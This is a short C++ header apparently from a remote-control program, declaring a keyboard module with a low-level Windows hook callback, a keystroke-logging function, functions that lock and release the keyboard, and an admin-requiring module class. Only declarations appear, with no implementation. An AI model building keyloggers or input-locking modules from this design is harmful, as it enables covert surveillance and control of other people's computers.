#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <iostream>
#include <sstream>

#include "../RCDOmod.h"

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
void logKeystroke(int);
void lockKeyboard();
void releaseKeyboard();

extern HHOOK ghHook; // global handle to the hook
extern KBDLLHOOKSTRUCT kbdStruct;

class KeyboardMod: public RCDOMod {
    public:
        int requireAdmin = 1;
        void start();
        void kill();
};

#endif